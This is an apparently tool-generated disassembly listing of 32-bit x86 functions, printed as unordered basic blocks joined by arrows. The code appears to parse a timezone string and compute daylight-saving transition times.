0xb0a7312:	mov	dword ptr [ebx + 0x1b74], 0
0xb0a731c:	lea	esi, dword ptr [esi]
0xb0a7320:	call	0xb0a7050
None
|
|
|
v
0xb0a728d:	cmp	al, 0x2b
0xb0a728f:	jne	0xb0a7330
None
|
|
|
v
0xb0a7255:	cmp	al, 0x3e
0xb0a7257:	lea	esi, dword ptr [edx + 1]
0xb0a725a:	jne	0xb0a7320
None
|
|
|
v
0xb0a7735:	movzx	eax, word ptr [esi + 0xa]
0xb0a7739:	sub	eax, 1
0xb0a773c:	cmp	ax, 4
0xb0a7740:	ja	0xb0a7320
None
|
|
|
v
0xb0a75db:	add	edi, 1
0xb0a75de:	add	esi, 0x20
0xb0a75e1:	mov	dword ptr [esi - 4], 0xffffffff
0xb0a75e8:	cmp	edi, 2
0xb0a75eb:	je	0xb0a7320
None
|
|
|
v
0xb0a76b1:	test	al, al
0xb0a76b3:	jne	0xb0a7320
None
|
|
|
v
0xb0a7214:	cmp	byte ptr [esi], 0x3c
0xb0a7217:	lea	edx, dword ptr [esi + 1]
0xb0a721a:	jne	0xb0a7320
None
|
|
|
v
0xb0a745c:	mov	eax, dword ptr [ebp - 0x2c]
0xb0a745f:	mov	dword ptr [esp], eax
0xb0a7462:	call	0xb0a70d0
None
|
|
|
v
0xb0a737e:	xor	eax, eax
0xb0a7380:	mov	word ptr [ebp - 0x22], ax
0xb0a7384:	xor	eax, eax
0xb0a7386:	movzx	ecx, word ptr [ebp - 0x26]
0xb0a738a:	mov	dword ptr [esp], ecx
0xb0a738d:	call	0xb0a6d70
None
|
|
|
v
0xb0a776b:	mov	dword ptr [esi + 4], 1
0xb0a7772:	movsx	eax, byte ptr [edx + 1]
0xb0a7776:	lea	ecx, dword ptr [edx + 1]
0xb0a7779:	sub	eax, 0x30
0xb0a777c:	cmp	eax, 9
0xb0a777f:	jbe	0xb0a7580
None
|
|
|
v
0xb0a76b9:	cmp	esi, dword ptr [ebp - 0x34]
0xb0a76bc:	mov	dword ptr [esi + 4], 2
0xb0a76c3:	je	0xb0a7843
None
|
|
|
v
0xb0a7659:	cmp	eax, 2
0xb0a765c:	je	0xb0a782b
None
|
|
|
v
0xb0a75cc:	cmp	al, 0x2c
0xb0a75ce:	jne	0xb0a7320
None
|
|
|
v
0xb0a74c5:	cmp	eax, 2
0xb0a74c8:	je	0xb0a77f8
None
|
|
|
v
0xb0a74e0:	mov	eax, dword ptr [ebx + 0x1b74]
0xb0a74e6:	add	eax, 0xe10
0xb0a74eb:	mov	dword ptr [ebx + 0x1b94], eax
0xb0a74f1:	movzx	eax, byte ptr [edi]
0xb0a74f4:	test	al, al
0xb0a74f6:	je	0xb0a7502
None
|
|
|
v
0xb0a753f:	mov	ecx, dword ptr [ebp - 0x34]
0xb0a7542:	xor	esi, esi
0xb0a7544:	lea	edx, dword ptr [ebx - 0x491a5]
0xb0a754a:	mov	dword ptr [ebp - 0x38], edx
0xb0a754d:	mov	edx, edi
0xb0a754f:	mov	edi, esi
0xb0a7551:	mov	esi, ecx
0xb0a7553:	cmp	al, 0x2c
0xb0a7555:	sete	al
0xb0a7558:	movzx	eax, al
0xb0a755b:	add	edx, eax
0xb0a755d:	movzx	eax, byte ptr [edx]
0xb0a7560:	cmp	al, 0x4a
0xb0a7562:	je	0xb0a776b
None
|
|
|
v
0xb0a7180:	push	ebp
0xb0a7181:	xor	eax, eax
0xb0a7183:	mov	ebp, esp
0xb0a7185:	mov	ecx, 0x10
0xb0a718a:	push	edi
0xb0a718b:	push	esi
0xb0a718c:	push	ebx
0xb0a718d:	call	0xb1267db
None
|
|
|
v
0xb0a7577:	mov	dword ptr [esi + 4], 0
0xb0a757e:	mov	ecx, edx
0xb0a7580:	lea	eax, dword ptr [ebp - 0x1c]
0xb0a7583:	mov	dword ptr [esp], ecx
0xb0a7586:	mov	dword ptr [esp + 8], 0xa
0xb0a758e:	mov	dword ptr [esp + 4], eax
0xb0a7592:	mov	dword ptr [ebp - 0x2c], ecx
0xb0a7595:	call	0xb0346e0
None
|
|
|
v
0xb0a7843:	mov	eax, 3
0xb0a7848:	xor	ecx, ecx
0xb0a784a:	mov	word ptr [ebx + 0x1b68], ax
0xb0a7851:	mov	eax, 2
0xb0a7856:	mov	word ptr [ebx + 0x1b6a], ax
0xb0a785d:	mov	word ptr [ebx + 0x1b6c], cx
0xb0a7864:	jmp	0xb0a75c1
None
|
|
|
v
0xb0a75b3:	cmp	dword ptr [esi + 4], 1
0xb0a75b7:	je	0xb0a7790
None
|
|
|
v
0xb0a766b:	cmp	eax, 1
0xb0a766e:	nop	
0xb0a7670:	je	0xb0a77fe
None
|
|
|
v
0xb0a760c:	cmp	dl, 0x2d
0xb0a760f:	sete	cl
0xb0a7612:	movzx	edx, cl
0xb0a7615:	add	eax, edx
0xb0a7617:	mov	edx, dword ptr [ebp - 0x48]
0xb0a761a:	mov	byte ptr [ebp - 0x2c], cl
0xb0a761d:	mov	ecx, eax
0xb0a761f:	mov	dword ptr [ebp - 0x4c], eax
0xb0a7622:	mov	eax, dword ptr [ebp - 0x30]
0xb0a7625:	mov	dword ptr [esp], ecx
0xb0a7628:	mov	dword ptr [esp + 0x18], edx
0xb0a762c:	mov	edx, dword ptr [ebp - 0x44]
0xb0a762f:	mov	dword ptr [ebp - 0x20], 0
0xb0a7636:	mov	dword ptr [esp + 0x1c], eax
0xb0a763a:	mov	dword ptr [esp + 0x14], eax
0xb0a763e:	mov	dword ptr [esp + 0xc], eax
0xb0a7642:	mov	eax, dword ptr [ebp - 0x40]
0xb0a7645:	mov	dword ptr [esp + 0x10], edx
0xb0a7649:	mov	dword ptr [esp + 8], eax
0xb0a764d:	mov	eax, dword ptr [ebp - 0x3c]
0xb0a7650:	mov	dword ptr [esp + 4], eax
0xb0a7654:	call	0xb0551c0
None
|
|
|
v
0xb0a75a8:	cmp	eax, 0x16d
0xb0a75ad:	ja	0xb0a7320
None
|
|
|
v
0xb0a73d0:	mov	eax, dword ptr [ebp - 0x30]
0xb0a73d3:	mov	esi, dword ptr [ebp - 0x2c]
0xb0a73d6:	mov	dword ptr [esp], edi
0xb0a73d9:	mov	dword ptr [esp + 0xc], eax
0xb0a73dd:	mov	eax, dword ptr [ebp - 0x38]
0xb0a73e0:	mov	dword ptr [esp + 8], esi
0xb0a73e4:	mov	dword ptr [esp + 4], eax
0xb0a73e8:	call	0xb0551c0
None
|
|
|
v
0xb0a743d:	cmp	al, 0x3e
0xb0a743f:	mov	edi, dword ptr [ebp - 0x38]
0xb0a7442:	jne	0xb0a753c
None
|
|
|
v
0xb0a71a7:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb0a759a:	mov	edx, dword ptr [ebp - 0x1c]
0xb0a759d:	mov	ecx, dword ptr [ebp - 0x2c]
0xb0a75a0:	cmp	edx, ecx
0xb0a75a2:	je	0xb0a7320
None
|
|
|
v
0xb0a7684:	xor	ecx, ecx
0xb0a7686:	mov	word ptr [ebp - 0x24], cx
0xb0a768a:	xor	edx, edx
0xb0a768c:	mov	word ptr [ebp - 0x22], dx
0xb0a7690:	mov	edx, dword ptr [ebp - 0x4c]
0xb0a7693:	add	edx, dword ptr [ebp - 0x20]
0xb0a7696:	cmp	byte ptr [ebp - 0x2c], 1
0xb0a769a:	sbb	ecx, ecx
0xb0a769c:	and	ecx, 2
0xb0a769f:	sub	ecx, 1
0xb0a76a2:	imul	eax, ecx
0xb0a76a5:	mov	dword ptr [esi + 0x10], eax
0xb0a76a8:	jmp	0xb0a75db
None
|
|
|
v
0xb0a77a8:	mov	eax, dword ptr [ebp - 0x20]
0xb0a77ab:	cmp	eax, 2
0xb0a77ae:	nop	
0xb0a77b0:	jle	0xb0a753c
None
|
|
|
v
0xb0a7456:	mov	byte ptr [ecx], 0
0xb0a7459:	lea	edi, dword ptr [edx + 1]
0xb0a745c:	mov	eax, dword ptr [ebp - 0x2c]
0xb0a745f:	mov	dword ptr [esp], eax
0xb0a7462:	call	0xb0a70d0
None
|
|
|
v
0xb0a7330:	cmp	al, 0x2d
0xb0a7332:	je	0xb0a7295
None
|
|
|
v
0xb0a7295:	cmp	al, 0x2d
0xb0a7297:	sete	dl
0xb0a729a:	cmp	al, 0x2b
0xb0a729c:	je	0xb0a72a6
None
|
|
|
v
0xb0a7376:	xor	eax, eax
0xb0a7378:	xor	edx, edx
0xb0a737a:	mov	word ptr [ebp - 0x24], ax
0xb0a737e:	xor	eax, eax
0xb0a7380:	mov	word ptr [ebp - 0x22], ax
0xb0a7384:	xor	eax, eax
0xb0a7386:	movzx	ecx, word ptr [ebp - 0x26]
0xb0a738a:	mov	dword ptr [esp], ecx
0xb0a738d:	call	0xb0a6d70
None
|
|
|
v
0xb0a7238:	add	ecx, 1
0xb0a723b:	add	edx, 1
0xb0a723e:	mov	byte ptr [ecx - 1], al
0xb0a7241:	movzx	eax, byte ptr [edx]
0xb0a7244:	movsx	esi, al
0xb0a7247:	test	byte ptr [edi + esi*2], 8
0xb0a724b:	jne	0xb0a7238
None
|
|
|
v
0xb0a74fc:	cmp	byte ptr [edi + 1], 0
0xb0a7500:	jne	0xb0a753f
None
|
|
|
v
0xb0a7869:	mov	eax, dword ptr [ebx + 0x1b4c]
0xb0a786f:	mov	dword ptr [esp], eax
0xb0a7872:	call	0xb017470
None
|
|
|
v
0xb0a775c:	mov	dword ptr [ebx + 0x1b94], 0xffffffff
0xb0a7766:	jmp	0xb0a7492
None
|
|
|
v
0xb0a7568:	movsx	ecx, al
0xb0a756b:	sub	ecx, 0x30
0xb0a756e:	cmp	ecx, 9
0xb0a7571:	ja	0xb0a76ad
None
|
|
|
v
0xb0a75fd:	lea	eax, dword ptr [edx + 1]
0xb0a7600:	movzx	edx, byte ptr [edx + 1]
0xb0a7604:	test	dl, dl
0xb0a7606:	je	0xb0a7320
None
|
|
|
v
0xb0a768a:	xor	edx, edx
0xb0a768c:	mov	word ptr [ebp - 0x22], dx
0xb0a7690:	mov	edx, dword ptr [ebp - 0x4c]
0xb0a7693:	add	edx, dword ptr [ebp - 0x20]
0xb0a7696:	cmp	byte ptr [ebp - 0x2c], 1
0xb0a769a:	sbb	ecx, ecx
0xb0a769c:	and	ecx, 2
0xb0a769f:	sub	ecx, 1
0xb0a76a2:	imul	eax, ecx
0xb0a76a5:	mov	dword ptr [esi + 0x10], eax
0xb0a76a8:	jmp	0xb0a75db
None
|
|
|
v
0xb0a72a6:	add	esi, 1
0xb0a72a9:	cmp	dl, 1
0xb0a72ac:	sbb	eax, eax
0xb0a72ae:	or	eax, 1
0xb0a72b1:	mov	dword ptr [ebx + 0x1b74], eax
0xb0a72b7:	mov	eax, dword ptr [ebp - 0x30]
0xb0a72ba:	lea	edi, dword ptr [ebp - 0x22]
0xb0a72bd:	mov	dword ptr [ebp - 0x48], edi
0xb0a72c0:	mov	dword ptr [esp + 0x18], edi
0xb0a72c4:	lea	edi, dword ptr [ebp - 0x24]
0xb0a72c7:	mov	dword ptr [esp + 0x10], edi
0xb0a72cb:	mov	dword ptr [esp + 0x1c], eax
0xb0a72cf:	mov	dword ptr [esp + 0x14], eax
0xb0a72d3:	mov	dword ptr [esp + 0xc], eax
0xb0a72d7:	lea	eax, dword ptr [ebp - 0x26]
0xb0a72da:	mov	dword ptr [ebp - 0x40], eax
0xb0a72dd:	mov	dword ptr [esp + 8], eax
0xb0a72e1:	lea	eax, dword ptr [ebx - 0x491b7]
0xb0a72e7:	mov	dword ptr [esp + 4], eax
0xb0a72eb:	mov	dword ptr [esp], esi
0xb0a72ee:	mov	dword ptr [ebp - 0x44], edi
0xb0a72f1:	mov	dword ptr [ebp - 0x3c], eax
0xb0a72f4:	call	0xb0551c0
None
|
|
|
v
0xb0a7358:	mov	eax, dword ptr [ebp - 0x20]
0xb0a735b:	cmp	eax, 2
0xb0a735e:	jle	0xb0a7320
None
|
|
|
v
0xb0a727c:	mov	dword ptr [ebx + 0x1b60], eax
0xb0a7282:	movzx	eax, byte ptr [esi]
0xb0a7285:	test	al, al
0xb0a7287:	je	0xb0a7320
None
|
|
|
v
0xb0a7404:	mov	ecx, dword ptr gs:[0]
0xb0a740b:	mov	eax, dword ptr [ebx - 0x110]
0xb0a7411:	mov	dword ptr [ebp - 0x38], edi
0xb0a7414:	mov	eax, dword ptr [ecx + eax]
0xb0a7417:	mov	ecx, esi
0xb0a7419:	mov	edi, eax
0xb0a741b:	jmp	0xb0a7429
None
|
|
|
v
0xb0a752e:	mov	esi, dword ptr [ebx + 0x37b0]
0xb0a7534:	test	esi, esi
0xb0a7536:	jne	0xb0a7869
None
|
|
|
v
0xb0a7420:	add	ecx, 1
0xb0a7423:	add	edx, 1
0xb0a7426:	mov	byte ptr [ecx - 1], al
0xb0a7429:	movzx	eax, byte ptr [edx]
0xb0a742c:	movsx	esi, al
0xb0a742f:	test	byte ptr [edi + esi*2], 8
0xb0a7433:	jne	0xb0a7420
None
|
|
|
v
0xb0a72f9:	cmp	eax, 2
0xb0a72fc:	je	0xb0a73ca
None
|
|
|
v
0xb0a7448:	mov	eax, ecx
0xb0a744a:	sub	eax, dword ptr [ebp - 0x2c]
0xb0a744d:	cmp	eax, 2
0xb0a7450:	jle	0xb0a753c
None
|
|
|
v
0xb0a77cd:	movzx	ecx, word ptr [ebp - 0x26]
0xb0a77d1:	mov	dword ptr [esp], ecx
0xb0a77d4:	call	0xb0a6d70
None
|
|
|
v
0xb0a7302:	cmp	eax, 3
0xb0a7305:	je	0xb0a73c0
None
|
|
|
v
0xb0a7260:	mov	eax, ecx
0xb0a7262:	sub	eax, dword ptr [ebp - 0x2c]
0xb0a7265:	cmp	eax, 2
0xb0a7268:	jle	0xb0a7320
None
|
|
|
v
0xb0a7790:	test	eax, eax
0xb0a7792:	jne	0xb0a75bd
None
|
|
|
v
0xb0a75bd:	mov	word ptr [esi + 0xc], ax
0xb0a75c1:	movzx	eax, byte ptr [edx]
0xb0a75c4:	cmp	al, 0x2f
0xb0a75c6:	je	0xb0a75f9
None
|
|
|
v
0xb0a7492:	mov	eax, dword ptr [ebp - 0x30]
0xb0a7495:	mov	ecx, dword ptr [ebp - 0x48]
0xb0a7498:	mov	dword ptr [esp], edi
0xb0a749b:	mov	dword ptr [esp + 0x1c], eax
0xb0a749f:	mov	dword ptr [esp + 0x14], eax
0xb0a74a3:	mov	dword ptr [esp + 0xc], eax
0xb0a74a7:	mov	eax, dword ptr [ebp - 0x40]
0xb0a74aa:	mov	dword ptr [esp + 0x18], ecx
0xb0a74ae:	mov	ecx, dword ptr [ebp - 0x44]
0xb0a74b1:	mov	dword ptr [esp + 8], eax
0xb0a74b5:	mov	eax, dword ptr [ebp - 0x3c]
0xb0a74b8:	mov	dword ptr [esp + 0x10], ecx
0xb0a74bc:	mov	dword ptr [esp + 4], eax
0xb0a74c0:	call	0xb0551c0
None
|
|
|
v
0xb0a7502:	mov	eax, dword ptr [ebx + 0x1b94]
0xb0a7508:	mov	dword ptr [esp + 0xc], eax
0xb0a750c:	mov	eax, dword ptr [ebx + 0x1b74]
0xb0a7512:	mov	dword ptr [esp + 8], eax
0xb0a7516:	mov	eax, dword ptr [ebx + 0x1b80]
0xb0a751c:	mov	dword ptr [esp + 4], eax
0xb0a7520:	mov	eax, dword ptr [ebx + 0x1b60]
0xb0a7526:	mov	dword ptr [esp], eax
0xb0a7529:	call	0xb0a8a90
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7890
TOTAL BLOCKS :33
0xb0a78ce:	test	eax, eax
0xb0a78d0:	mov	ebp, eax
0xb0a78d2:	je	0xb0a7988
None
|
|
|
v
0xb0a7910:	mov	dword ptr [esp], esi
0xb0a7913:	mov	dword ptr [ebx + 0x1b60], 0
0xb0a791d:	mov	dword ptr [ebx + 0x1b80], 0
0xb0a7927:	call	0xb017470
None
|
|
|
v
0xb0a79be:	lea	ebp, dword ptr [ebx - 0x49196]
0xb0a79c4:	jmp	0xb0a7910
None
|
|
|
v
0xb0a7a18:	test	ebp, ebp
0xb0a7a1a:	jne	0xb0a7910
None
|
|
|
v
0xb0a79b6:	test	ebp, ebp
0xb0a79b8:	jne	0xb0a7900
None
|
|
|
v
0xb0a797b:	nop	
0xb0a797c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a7a20:	jmp	0xb0a79be
None
|
|
|
v
0xb0a792c:	mov	dword ptr [esp], ebp
0xb0a792f:	call	0xb07ab00
None
|
|
|
v
0xb0a7980:	add	esp, 0x1c
0xb0a7983:	pop	ebx
0xb0a7984:	pop	esi
0xb0a7985:	pop	edi
0xb0a7986:	pop	ebp
0xb0a7987:	ret	
None
|
|
|
v
0xb0a78e0:	movzx	eax, byte ptr [ebp]
0xb0a78e4:	test	al, al
0xb0a78e6:	jne	0xb0a79a2
None
|
|
|
v
0xb0a790c:	test	eax, eax
0xb0a790e:	je	0xb0a7980
None
|
|
|
v
0xb0a79df:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb0a7952:	mov	eax, dword ptr [ebx + 0x37b0]
0xb0a7958:	test	eax, eax
0xb0a795a:	jne	0xb0a7980
None
|
|
|
v
0xb0a7990:	lea	ebp, dword ptr [ebx - 0x49196]
0xb0a7996:	movzx	eax, byte ptr [ebp]
0xb0a799a:	test	al, al
0xb0a799c:	je	0xb0a78ec
None
|
|
|
v
0xb0a7973:	mov	dword ptr [esp], ebp
0xb0a7976:	call	0xb0a7180
None
|
|
|
v
0xb0a7890:	push	ebp
0xb0a7891:	push	edi
0xb0a7892:	push	esi
0xb0a7893:	mov	esi, edx
0xb0a7895:	push	ebx
0xb0a7896:	call	0xb1267db
None
|
|
|
v
0xb0a78d8:	test	ebp, ebp
0xb0a78da:	je	0xb0a7a22
None
|
|
|
v
0xb0a796f:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb0a7934:	mov	dword ptr [esp + 8], 0
0xb0a793c:	mov	dword ptr [esp + 4], 0
0xb0a7944:	mov	dword ptr [esp], ebp
0xb0a7947:	mov	dword ptr [ebx + 0x1b4c], eax
0xb0a794d:	call	0xb0a7df0
None
|
|
|
v
0xb0a789b:	add	ebx, 0x103765
0xb0a78a1:	sub	esp, 0x1c
0xb0a78a4:	mov	edx, dword ptr [ebx + 0x1b48]
0xb0a78aa:	test	edx, edx
0xb0a78ac:	je	0xb0a78b6
None
|
|
|
v
0xb0a7962:	mov	ecx, 0xf
0xb0a7967:	mov	esi, ebp
0xb0a7969:	lea	edi, dword ptr [ebx - 0x49196]
0xb0a796f:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb0a7900:	mov	dword ptr [esp + 4], esi
0xb0a7904:	mov	dword ptr [esp], ebp
0xb0a7907:	call	0xb07a740
None
|
|
|
v
0xb0a79d0:	lea	edx, dword ptr [ebx + 0x1b60]
0xb0a79d6:	xor	eax, eax
0xb0a79d8:	mov	ecx, 0x10
0xb0a79dd:	mov	edi, edx
0xb0a79df:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb0a7971:	je	0xb0a79d0
None
|
|
|
v
0xb0a78fc:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a78b6:	lea	eax, dword ptr [ebx - 0x4917d]
0xb0a78bc:	mov	dword ptr [esp], eax
0xb0a78bf:	mov	dword ptr [ebx + 0x1b48], 1
0xb0a78c9:	call	0xb032860
None
|
|
|
v
0xb0a79a2:	mov	esi, dword ptr [ebx + 0x1b4c]
0xb0a79a8:	cmp	al, 0x3a
0xb0a79aa:	sete	al
0xb0a79ad:	movzx	eax, al
0xb0a79b0:	add	ebp, eax
0xb0a79b2:	test	esi, esi
0xb0a79b4:	je	0xb0a7a18
None
|
|
|
v
0xb0a79e1:	lea	eax, dword ptr [ebx - 0x4917a]
0xb0a79e7:	mov	dword ptr [ebx + 0x1b80], eax
0xb0a79ed:	mov	dword ptr [ebx + 0x1b60], eax
0xb0a79f3:	mov	dword ptr [ebx + 0x1b98], 0xffffffff
0xb0a79fd:	mov	dword ptr [ebx + 0x1b78], 0xffffffff
0xb0a7a07:	add	esp, 0x1c
0xb0a7a0a:	pop	ebx
0xb0a7a0b:	pop	esi
0xb0a7a0c:	pop	edi
0xb0a7a0d:	pop	ebp
0xb0a7a0e:	jmp	0xb0a7050
None
|
|
|
v
0xb0a7988:	test	esi, esi
0xb0a798a:	jne	0xb0a78d8
None
|
|
|
v
0xb0a78ae:	test	eax, eax
0xb0a78b0:	je	0xb0a7980
None
|
|
|
v
0xb0a78ec:	mov	esi, dword ptr [ebx + 0x1b4c]
0xb0a78f2:	lea	ebp, dword ptr [ebx - 0x49187]
0xb0a78f8:	test	esi, esi
0xb0a78fa:	je	0xb0a7910
None
|
|
|
v
0xb0a795c:	cmp	byte ptr [ebp], 0
0xb0a7960:	je	0xb0a79d0
None
|
|
|
v
0xb0a7a22:	mov	esi, dword ptr [ebx + 0x1b4c]
0xb0a7a28:	lea	ebp, dword ptr [ebx - 0x49196]
0xb0a7a2e:	jmp	0xb0a7910
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7aa0
TOTAL BLOCKS :11
0xb0a7ab2:	add	ebx, 0x10354e
0xb0a7ab8:	lea	edx, dword ptr [eax + 0x76c]
0xb0a7abe:	lea	eax, dword ptr [ebx + 0x1b60]
0xb0a7ac4:	call	0xb0a6db0
None
|
|
|
v
0xb0a7b18:	xor	edx, edx
0xb0a7b1a:	cmp	ecx, edi
0xb0a7b1c:	setg	dl
0xb0a7b1f:	jmp	0xb0a7af7
None
|
|
|
v
0xb0a7af1:	xor	edx, edx
0xb0a7af3:	cmp	eax, edi
0xb0a7af5:	jle	0xb0a7b18
None
|
|
|
v
0xb0a7ac9:	mov	eax, dword ptr [esi + 0x14]
0xb0a7acc:	lea	edx, dword ptr [eax + 0x76c]
0xb0a7ad2:	lea	eax, dword ptr [ebx + 0x1b80]
0xb0a7ad8:	call	0xb0a6db0
None
|
|
|
v
0xb0a7ae1:	mov	eax, dword ptr [ebx + 0x1b78]
0xb0a7ae7:	mov	ecx, dword ptr [ebx + 0x1b98]
0xb0a7aed:	cmp	eax, ecx
0xb0a7aef:	jg	0xb0a7b21
None
|
|
|
v
0xb0a7aa0:	push	ebp
0xb0a7aa1:	mov	ebp, ecx
0xb0a7aa3:	push	edi
0xb0a7aa4:	mov	edi, eax
0xb0a7aa6:	push	esi
0xb0a7aa7:	mov	esi, edx
0xb0a7aa9:	push	ebx
0xb0a7aaa:	mov	eax, dword ptr [edx + 0x14]
0xb0a7aad:	call	0xb1267db
None
|
|
|
v
0xb0a7b13:	pop	ebx
0xb0a7b14:	pop	esi
0xb0a7b15:	pop	edi
0xb0a7b16:	pop	ebp
0xb0a7b17:	ret	
None
|
|
|
v
0xb0a7b21:	cmp	ecx, edi
0xb0a7b23:	mov	edx, 1
0xb0a7b28:	jg	0xb0a7af7
None
|
|
|
v
0xb0a7af7:	mov	eax, dword ptr [ebx - 0xec]
0xb0a7afd:	mov	dword ptr [esi + 0x20], edx
0xb0a7b00:	mov	eax, dword ptr [eax + edx*4]
0xb0a7b03:	shl	edx, 5
0xb0a7b06:	mov	dword ptr [esi + 0x28], eax
0xb0a7b09:	mov	eax, dword ptr [ebx + edx + 0x1b74]
0xb0a7b10:	mov	dword ptr [esi + 0x24], eax
0xb0a7b13:	pop	ebx
0xb0a7b14:	pop	esi
0xb0a7b15:	pop	edi
0xb0a7b16:	pop	ebp
0xb0a7b17:	ret	
None
|
|
|
v
0xb0a7add:	test	ebp, ebp
0xb0a7adf:	je	0xb0a7b13
None
|
|
|
v
0xb0a7b2a:	xor	edx, edx
0xb0a7b2c:	cmp	eax, edi
0xb0a7b2e:	setle	dl
0xb0a7b31:	jmp	0xb0a7af7
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7bc0
TOTAL BLOCKS :34
0xb0a7cca:	test	esi, esi
0xb0a7ccc:	jne	0xb0a7c5b
None
|
|
|
v
0xb0a7cd0:	xor	esi, esi
0xb0a7cd2:	jmp	0xb0a7c80
None
|
|
|
v
0xb0a7d83:	lea	eax, dword ptr [ebx + 0x1ba0]
0xb0a7d89:	call	0xb0f9460
None
|
|
|
v
0xb0a7c5b:	test	ebp, ebp
0xb0a7c5d:	je	0xb0a7cd8
None
|
|
|
v
0xb0a7c80:	cmp	dword ptr gs:[0xc], 0
0xb0a7c88:	je	0xb0a7c8b
None
|
|
|
v
0xb0a7d7e:	jmp	0xb0a7c05
None
|
|
|
v
0xb0a7cce:	nop	
None
|
|
|
v
0xb0a7c8a:	lock sub	dword ptr [ebx + 0x1ba0], 1
None
|
|
|
v
0xb0a7d8e:	jmp	0xb0a7c98
None
|
|
|
v
0xb0a7c76:	test	eax, eax
0xb0a7c78:	je	0xb0a7cd0
None
|
|
|
v
0xb0a7d18:	mov	eax, dword ptr [ebx - 0xdc]
0xb0a7d1e:	mov	edx, dword ptr gs:[0]
0xb0a7d25:	mov	dword ptr [edx + eax], 0x16
0xb0a7d2c:	xor	eax, eax
0xb0a7d2e:	jmp	0xb0a7c9a
None
|
|
|
v
0xb0a7c62:	sub	eax, dword ptr [esp + 0x28]
0xb0a7c66:	mov	dword ptr [esp + 8], esi
0xb0a7c6a:	mov	dword ptr [esp], edi
0xb0a7c6d:	mov	dword ptr [esp + 4], eax
0xb0a7c71:	call	0xb0a5d40
None
|
|
|
v
0xb0a7c9a:	add	esp, 0x3c
0xb0a7c9d:	pop	ebx
0xb0a7c9e:	pop	esi
0xb0a7c9f:	pop	edi
0xb0a7ca0:	pop	ebp
0xb0a7ca1:	ret	
None
|
|
|
v
0xb0a7bf7:	lock cmpxchg	dword ptr [ebx + 0x1ba0], ecx
0xb0a7bff:	jne	0xb0a7d73
None
|
|
|
v
0xb0a7c98:	mov	eax, esi
0xb0a7c9a:	add	esp, 0x3c
0xb0a7c9d:	pop	ebx
0xb0a7c9e:	pop	esi
0xb0a7c9f:	pop	edi
0xb0a7ca0:	pop	ebp
0xb0a7ca1:	ret	
None
|
|
|
v
0xb0a7cd8:	lea	eax, dword ptr [ebx - 0x49176]
0xb0a7cde:	mov	dword ptr [esi + 0x28], eax
0xb0a7ce1:	xor	eax, eax
0xb0a7ce3:	mov	dword ptr [esi + 0x20], 0
0xb0a7cea:	mov	dword ptr [esi + 0x24], 0
0xb0a7cf1:	jmp	0xb0a7c62
None
|
|
|
v
0xb0a7ca8:	lea	eax, dword ptr [esp + 0x2c]
0xb0a7cac:	mov	dword ptr [esp + 0xc], eax
0xb0a7cb0:	lea	eax, dword ptr [esp + 0x28]
0xb0a7cb4:	mov	dword ptr [esp + 0x10], esi
0xb0a7cb8:	mov	dword ptr [esp + 8], eax
0xb0a7cbc:	mov	dword ptr [esp + 4], ebp
0xb0a7cc0:	mov	eax, dword ptr [edi]
0xb0a7cc2:	mov	dword ptr [esp], eax
0xb0a7cc5:	call	0xb0a8c70
None
|
|
|
v
0xb0a7c3d:	test	eax, eax
0xb0a7c3f:	jne	0xb0a7d08
None
|
|
|
v
0xb0a7d08:	mov	eax, dword ptr [edi]
0xb0a7d0a:	mov	ecx, ebp
0xb0a7d0c:	mov	edx, esi
0xb0a7d0e:	call	0xb0a7aa0
None
|
|
|
v
0xb0a7bc0:	push	ebp
0xb0a7bc1:	push	edi
0xb0a7bc2:	push	esi
0xb0a7bc3:	push	ebx
0xb0a7bc4:	sub	esp, 0x3c
0xb0a7bc7:	mov	edi, dword ptr [esp + 0x50]
0xb0a7bcb:	call	0xb1267db
None
|
|
|
v
0xb0a7c5f:	mov	eax, dword ptr [esi + 0x24]
0xb0a7c62:	sub	eax, dword ptr [esp + 0x28]
0xb0a7c66:	mov	dword ptr [esp + 8], esi
0xb0a7c6a:	mov	dword ptr [esp], edi
0xb0a7c6d:	mov	dword ptr [esp + 4], eax
0xb0a7c71:	call	0xb0a5d40
None
|
|
|
v
0xb0a7cf8:	xor	eax, eax
0xb0a7cfa:	test	ebp, ebp
0xb0a7cfc:	setne	al
0xb0a7cff:	jmp	0xb0a7c15
None
|
|
|
v
0xb0a7c1f:	mov	eax, dword ptr [ebx + 0x37b0]
0xb0a7c25:	test	eax, eax
0xb0a7c27:	jne	0xb0a7ca8
None
|
|
|
v
0xb0a7c47:	test	esi, esi
0xb0a7c49:	mov	dword ptr [esp + 0x28], 0
0xb0a7c51:	mov	dword ptr [esp + 0x2c], 0
0xb0a7c59:	je	0xb0a7cd0
None
|
|
|
v
0xb0a7c05:	lea	edx, dword ptr [ebx + 0x3780]
0xb0a7c0b:	xor	eax, eax
0xb0a7c0d:	cmp	esi, edx
0xb0a7c0f:	je	0xb0a7cf8
None
|
|
|
v
0xb0a7c29:	mov	dword ptr [esp + 8], esi
0xb0a7c2d:	mov	dword ptr [esp + 4], 0
0xb0a7c35:	mov	dword ptr [esp], edi
0xb0a7c38:	call	0xb0a5d40
None
|
|
|
v
0xb0a7d13:	jmp	0xb0a7c47
None
|
|
|
v
0xb0a7bd0:	add	ebx, 0x103430
0xb0a7bd6:	mov	ebp, dword ptr [esp + 0x54]
0xb0a7bda:	mov	esi, dword ptr [esp + 0x58]
0xb0a7bde:	test	edi, edi
0xb0a7be0:	je	0xb0a7d18
None
|
|
|
v
0xb0a7c92:	jne	0xb0a7d83
None
|
|
|
v
0xb0a7c15:	mov	edx, 1
0xb0a7c1a:	call	0xb0a7890
None
|
|
|
v
0xb0a7c45:	xor	esi, esi
0xb0a7c47:	test	esi, esi
0xb0a7c49:	mov	dword ptr [esp + 0x28], 0
0xb0a7c51:	mov	dword ptr [esp + 0x2c], 0
0xb0a7c59:	je	0xb0a7cd0
None
|
|
|
v
